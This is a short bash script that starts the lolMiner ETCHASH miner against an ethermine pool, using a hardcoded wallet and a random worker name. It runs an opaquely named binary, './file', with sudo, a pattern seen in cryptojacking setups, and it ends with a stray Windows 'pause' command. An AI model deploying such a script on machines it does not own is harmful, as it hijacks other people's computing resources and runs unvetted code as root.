#!/bin/bash

POOL=asia1-etc.ethermine.org:4444
ETH_WALLET=0x34cf2ce874be8ff86731f1c9dd30c1bd688afa44
YOUR_WORKER_NAME=$(echo $(shuf -i 1-3 -n 1)-com)

cd "$(dirname "$0")"

chmod +x ./file && sudo ./file lolMiner --algo ETCHASH --pool $POOL --user $ETH_WALLET.$YOUR_WORKER_NAME
pause